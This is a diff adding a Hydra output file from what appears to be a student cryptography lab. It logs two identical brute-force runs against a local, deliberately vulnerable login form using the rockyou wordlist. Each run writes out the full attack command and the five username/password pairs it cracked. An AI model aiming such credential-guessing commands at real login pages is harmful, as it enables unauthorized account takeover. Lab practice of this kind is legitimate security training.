@@ -1,0 +1,12 @@
+# Hydra v9.6 run at 2025-09-28 21:23:01 on 127.0.0.1 http-get-form (hydra -vV -o resultados_finales.txt -L /Users/timtim/Desktop/todo xd/Cripto/lab2/users.txt -P /Users/timtim/Desktop/todo xd/Cripto/lab2/rockyou.txt http-get-form://127.0.0.1:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=810c0cb4c04a1fcb468d2f2cfb629af5; security=low:F=Username and/or password incorrect)
+[4280][http-get-form] host: 127.0.0.1   login: admin   password: password
+[4280][http-get-form] host: 127.0.0.1   login: gordonb   password: abc123
+[4280][http-get-form] host: 127.0.0.1   login: smithy   password: password
+[4280][http-get-form] host: 127.0.0.1   login: pablo   password: letmein
+[4280][http-get-form] host: 127.0.0.1   login: 1337   password: charley
+# Hydra v9.6 run at 2025-09-28 23:06:02 on 127.0.0.1 http-get-form (hydra -vV -o resultados_finales.txt -L /Users/timtim/Desktop/todo xd/Cripto/lab2/users.txt -P /Users/timtim/Desktop/todo xd/Cripto/lab2/rockyou.txt http-get-form://127.0.0.1:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=810c0cb4c04a1fcb468d2f2cfb629af5; security=low:F=Username and/or password incorrect)
+[4280][http-get-form] host: 127.0.0.1   login: admin   password: password
+[4280][http-get-form] host: 127.0.0.1   login: gordonb   password: abc123
+[4280][http-get-form] host: 127.0.0.1   login: smithy   password: password
+[4280][http-get-form] host: 127.0.0.1   login: pablo   password: letmein
+[4280][http-get-form] host: 127.0.0.1   login: 1337   password: charley
